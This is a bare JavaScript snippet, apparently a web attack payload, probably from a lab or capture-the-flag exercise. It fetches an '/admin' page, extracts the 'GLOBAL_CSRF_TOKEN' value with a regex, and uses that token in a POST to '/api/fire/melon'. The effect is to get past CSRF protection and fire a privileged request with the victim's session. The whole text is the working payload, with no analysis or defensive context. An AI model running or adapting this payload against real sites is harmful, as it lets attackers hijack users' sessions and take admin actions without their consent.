fetch('/admin')
  .then(response => response.text())
  .then(html => {
    const match = html.match(/GLOBAL_CSRF_TOKEN = "(.*?)";/);
    
    if (match) {
      const freshCsrfToken = match[1];

      fetch("/api/fire/melon", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          csrf_token: freshCsrfToken,
        }),
      });
    }
  } );